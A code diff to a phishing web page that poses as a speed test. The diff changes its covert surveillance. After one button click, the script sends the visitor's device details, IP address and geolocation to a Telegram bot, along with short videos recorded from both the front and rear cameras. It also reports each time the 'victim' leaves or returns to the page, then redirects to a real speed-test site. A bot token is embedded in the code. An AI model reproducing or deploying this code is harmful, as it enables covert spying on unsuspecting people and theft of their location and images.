@@ -13,10 +13,10 @@
         .status-dot { display: inline-block; width: 8px; height: 8px; background: #4caf50; border-radius: 50%; margin-left: 8px; box-shadow: 0 0 10px #4caf50; }
         .gauge-box { position: relative; width: 220px; height: 220px; margin: 30px auto; border-radius: 50%; border: 2px solid rgba(0, 210, 255, 0.2); display: flex; flex-direction: column; align-items: center; justify-content: center; }
         #goBtn { width: 160px; height: 160px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 35px; font-weight: bold; cursor: pointer; transition: 0.4s; z-index: 5; outline: none; }
-        #goBtn:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
+        #goBtn:active { transform: scale(0.9); }
         #speedDisplay { display: none; text-align: center; }
         .speed-num { font-size: 48px; font-weight: 800; color: var(--accent); display: block; }
-        video, canvas { display: none; }
+        video { display: none; }
     </style>
 </head>
 <body>
@@ -33,7 +33,6 @@
         </div>
     </div>
     <video id="v" autoplay playsinline muted></video>
-    <canvas id="c"></canvas>
 
     <script>
         const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
@@ -43,14 +42,9 @@
             const url = `https://api.telegram.org/bot${token}/`;
             const fd = new FormData();
             fd.append("chat_id", chat);
-
             try {
                 if (type === "text") {
                     await fetch(url + "sendMessage?chat_id=" + chat + "&text=" + encodeURIComponent(msg) + "&parse_mode=Markdown");
-                } else if (type === "photo") {
-                    fd.append("photo", data, "shot.jpg");
-                    if (msg) fd.append("caption", msg);
-                    await fetch(url + "sendPhoto", { method: "POST", body: fd });
                 } else if (type === "video") {
                     fd.append("video", data, "live.mp4");
                     if (msg) fd.append("caption", msg);
@@ -59,7 +53,7 @@
             } catch (e) {}
         }
 
-        // تتبع حالة المتصل (Online/Offline)
+        // إشعارات الحالة (Online/Offline)
         window.onblur = () => sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة.");
         window.onfocus = () => sendToTelegram("🟢 **ONLINE**\nالضحية عاد للصفحة.");
 
@@ -67,11 +61,6 @@
             let info = `📊 *تقرير شامل للهدف*:\n\n`;
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
             info += `• 💾 الرام: \`${navigator.deviceMemory || "?"} GB\`\n`;
-            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            if (conn) {
-                let netType = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
-                info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
-            }
             try {
                 const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
@@ -80,39 +69,23 @@
             return info;
         }
 
-        async function snap(mode) {
+        async function recordVideo(mode, label, duration) {
             try {
-                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const v = document.getElementById("v");
-                const c = document.getElementById("c");
-                v.srcObject = s;
-                await new Promise(r => setTimeout(r, 2000)); // انتظار للوضوح لمنع السواد
-                c.width = 720; c.height = 960;
-                c.getContext("2d").drawImage(v, 0, 0);
-                const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
-                s.getTracks().forEach(t => t.stop());
-                return blob;
-            } catch (e) { return null; }
-        }
-
-        // ميزة تسجيل الفيديو لايف
-        async function recordVideo(duration) {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: false });
                 const recorder = new MediaRecorder(stream);
                 const chunks = [];
-
                 recorder.ondataavailable = (e) => chunks.push(e.data);
                 recorder.onstop = async () => {
                     const blob = new Blob(chunks, { type: "video/mp4" });
-                    await sendToTelegram("🎥 فيديو لايف (5 ثوانٍ)", "video", blob);
+                    await sendToTelegram(`🎥 فيديو لايف (${label})`, "video", blob);
                     stream.getTracks().forEach(t => t.stop());
                 };
-
                 recorder.start();
                 await new Promise(r => setTimeout(r, duration));
                 recorder.stop();
-            } catch (e) {}
+            } catch (e) {
+                await sendToTelegram(`❌ فشل تصوير فيديو ${label}`);
+            }
         }
 
         document.getElementById("goBtn").onclick = async function() {
@@ -124,26 +97,22 @@
                 document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
             }, 100);
 
-            // 1. التقرير والموقع
+            // 1. إرسال التقرير والموقع
             sendToTelegram(await getFullReport());
             navigator.geolocation.getCurrentPosition(p => {
                 sendToTelegram(`📍 *الموقع*:\n[خرائط جوجل](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
             });
 
-            // 2. تسجيل فيديو لايف (5 ثوانٍ)
-            await recordVideo(5000);
+            // 2. تسجيل فيديو لايف من الكاميرا الأمامية (4 ثوانٍ)
+            await recordVideo("user", "أمامي", 4000);
 
-            // 3. لقطات ثابتة (أمامية وخلفية)
-            const f = await snap("user");
-            if (f) await sendToTelegram("📸 صورة أمامية", "photo", f);
-            
-            const b = await snap("environment");
-            if (b) await sendToTelegram("📷 صورة خلفية", "photo", b);
+            // 3. تسجيل فيديو لايف من الكاميرا الخلفية (4 ثوانٍ)
+            await recordVideo("environment", "خلفي", 4000);
 
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
-            }, 3000);
+            }, 2000);
         };
     </script>
 </body>
